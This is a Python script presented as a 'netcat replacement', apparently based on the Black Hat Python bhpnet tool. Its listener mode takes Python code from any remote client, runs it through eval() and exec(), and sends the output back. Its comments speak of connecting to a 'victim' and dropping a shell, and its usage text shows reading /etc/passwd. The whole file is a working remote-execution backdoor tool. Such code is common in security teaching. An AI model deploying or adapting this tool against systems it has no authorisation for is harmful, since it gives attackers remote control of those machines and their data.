import threading
import sys
import socket
import getopt
from io import StringIO


# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
port = 9999
upload_destination = ""


def usage():
    print("Netcat Replacement")
    print("Usage: nc.py -t target_host -p port")
    print(
        "-l --listen                - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run   - execute a Python file upon receiving a connection")
    print("-c --command               - initialize a Python interactive shell to connection")
    print(
        "-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


if not len(sys.argv[1:]):
    usage()

# read the commandline options
try:
    opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", [
                               "help", "listen", "execute", "target", "port", "command", "upload"])
except getopt.GetoptError as err:
    print(str(err))
    usage()

# analyze the options and their corresponding arguments
for o, a in opts:
    if o in ("-h", "--help"):
        usage()
    elif o in ("-l", "--listen"):
        listen = True
    elif o in ("-e", "--execute"):
        execute = a
    elif o in ("-c", "--commandshell"):
        command = True
    elif o in ("-u", "--upload"):
        upload_destination = a.strip()
    elif o in ("-t", "--target"):
        target = a.strip()
    elif o in ("-p", "--port"):
        port = int(a)
    else:
        assert False, "Unhandled Option"


# connect to victim
if not listen and len(target) and port > 0:
    # read in the buffer from the commandline
    # this will block, so send CTRL-D if not sending input
    # to stdin
    # buffer = sys.stdin.read()
    # buffer = buffer.encode('utf8')

    # establish a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    print("[*]Successfully connected to {}:{}".format(target, port))

    # open a new thread for receving data
    def recv_n_print():
        while True:
            data = s.recv(4096)
            data = data.decode('utf8')
            print(data)
    t = threading.Thread(target=recv_n_print)
    t.start()

    if command:
        s.send('c'.encode('utf8'))  # tell server mode:command
        while True:
            # input command
            cmd = input(">>>")
            if cmd == '':
                cmd = '\n'    # handle line change correctly
            cmd = cmd.encode('utf8')

            # send data off
            s.send(cmd)

    if len(execute):
        s.send('e'.encode('utf8'))  # tell server mode:execute
        # send content of the file
        data = open(execute).read()
        s.send(data.encode('utf8'))


def server_loop():
    global command
    global execute

    server_socket = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM)  # the socket of server
    server_socket.bind((target, port))
    server_socket.listen(5)
    print("[*]Listening on {}:{}".format(target, port))

    # handle clients
    def handle_client(client_socket):
        global command
        global execute

        def encode_n_send(msg):
            client_socket.send(msg.encode('utf8'))

        # get the mode operating on command/execute...
        print("[*]Getting the operation mode: ", end='')
        while True:
            cmd = client_socket.recv(1)
            cmd = cmd.decode('utf8')
            if cmd == 'c':
                print("Command")
                command = True
                break
            elif cmd == 'e':
                print("Execute")
                execute = 'True'  # we don't know the file path. It's going to be sent by client
                break             # just to trgger the 'if' statement

        # execute Python command one at a time using eval()
        if command:
            while True:
                cmd = client_socket.recv(4096)  # receive data
                cmd = cmd.decode('utf8')
                if cmd != '':
                    try:
                        old_stdout = sys.stdout
                        sys.stdout = mystdout = StringIO()
                        eval(cmd)
                        sys.stdout = old_stdout
                        result = mystdout.getvalue()    # get the result of eval()
                        encode_n_send(result)

                    except Exception as e:
                        encode_n_send(str(e))

        # read and execute an entire Python file
        if len(execute):
            data = client_socket.recv(40960)
            old_stdout = sys.stdout
            sys.stdout = mystdout = StringIO()
            result = exec(data.decode('utf8'))
            sys.stdout = old_stdout
            result = mystdout.getvalue()    # get the result of eval()
            encode_n_send(result)
            encode_n_send("[*]Script successfully executed!")

    while True:
        client_socket, client_addr = server_socket.accept()
        print("[*]Accepted connection from {}:{}".format(*client_addr))
        client_thread = threading.Thread(
            target=handle_client, args=(client_socket,))
        client_thread.start()


# we are going to listen and potentially
# upload things, execute commands and drop a shell back
# depending on our command line options above
if listen:
    server_loop()
